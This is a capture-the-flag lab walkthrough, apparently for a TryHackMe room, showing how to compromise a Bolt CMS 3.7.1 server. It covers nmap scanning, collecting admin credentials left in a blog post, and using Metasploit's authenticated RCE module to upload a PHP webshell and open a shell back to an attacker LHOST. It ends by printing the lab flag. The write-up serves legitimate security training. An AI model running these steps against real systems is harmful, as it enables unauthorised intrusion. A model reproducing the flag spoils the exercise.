# Technical Documentation: Bolt Lab Walkthrough
## Executive Summary
This document outlines the penetration testing methodology and execution steps for the Bolt lab. The assessment involved initial port enumeration, public web entry identification, administrative credential discovery via posted content, authenticated Remote Code Execution (RCE) via Metasploit, and local flag retrieval.

Target & Vulnerability Overview
- Target IP Address: ```10.49.169.55```
- Target Services:
  - Port ```22/tcp```: SSH (OpenSSH 7.6p1)
  - Port ```80/tcp```: HTTP (Apache 2.4.29)
  - Port ```8000/tcp```: HTTP (Bolt CMS v3.7.1 / PHP 7.2.32)
- Discovered Credentials: ```bolt``` : ```boltadmin123```
- Vulnerability Class: Authenticated Remote Code Execution (RCE)
- Exploit Module: ```exploit/unix/webapp/bolt_authenticated_rce```
- Primary Objective: Gain initial access via RCE and capture ```flag.txt``` from ```/home```.

Exploitation Execution Flow
1. Nmap Network Scanning & Enumeration
An initial Nmap service scan was run against target IP ```10.49.169.55```:
```bash
nmap -sV -sC -p- 10.49.169.55
```
- Key Findings:
  - Port 80 displays an Apache default Ubuntu web page.
  - Port 8000 hosts Bolt CMS (Title: Bolt | A hero is unleashed) running on PHP 7.2.32.

2. Web Enumeration & Credential Gathering
  1. Browsing to ```[http://10.49.169.55:8000/](http://10.49.169.55:8000/)``` revealed the main Bolt CMS blog/forum interface.
  2. Navigating through the pages showed a post titled "Message for IT Department" authored by Jake (Admin):
            "i suppose this is our secret forum right? I posted my first message for our readers today but there seems to be a lot of freespace out there. Please check it out! my password is boltadmin123 just incase you need it!"
  3. Cross-referencing another post ("Message From Admin") confirmed the username ```bolt``` ("myself Jake and my username is bolt").

3. CMS Authentication
   1. Navigated to the login route: ```[http://10.49.169.55:8000/bolt/login](http://10.49.169.55:8000/bolt/login)```.
   2. Logged into the dashboard using:
      - Username / Email: ```bolt```
      - Password: ```boltadmin123```
   3. Verified the exact CMS version running at the footer: Bolt 3.7.1.

4. Metasploit Exploitation
Searchsploit and Exploit-DB confirm an authenticated RCE issue for Bolt CMS <= 3.7.0 / 3.7.1 (EDB-ID: 48296).
   1. Launched Metasploit console and searched for the module:
```plaintext
msfconsole -q
msf > search 48296
msf > use exploit/unix/webapp/bolt_authenticated_rce
```
  2. Configured module options:
```plaintext
set LHOST 192.168.130.247
set RHOSTS 10.49.169.55
set RPORT 8000
set USERNAME bolt
set PASSWORD boltadmin123
set TARGET 2 (Linux cmd)
```
  3. Executed the exploit:
```plaintext
msf > run
```
- Metasploit uploaded a PHP webshell payload via the file upload/token mechanism, executed the code, and opened command shell session 1.

5. System Reconnaissance & Flag Exfiltration
  1. Inspected current directory and listed files under /home:
```bash
cd /home
ls
```
  2. Located /home/flag.txt and read its content:
```bash
cat flag.txt
```
Summary Table: Target & Findings
| Parameter / Metric      | Target Value / Result                       |
|:--                      |:--                                          |
| Lab Name                | Bolt                                        | 
| Target IP               | 10.49.169.55                                |
| Open Ports              | "22 (SSH), 80 (HTTP), 8000 (Bolt CMS)"      |
| Discovered Credentials  | bolt : boltadmin123                         | 
| Exploit Used            | exploit/unix/webapp/bolt_authenticated_rce  | 
| Target Setting          | 2 (Linux (cmd))                             |
| Captured Flag           | THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}           |
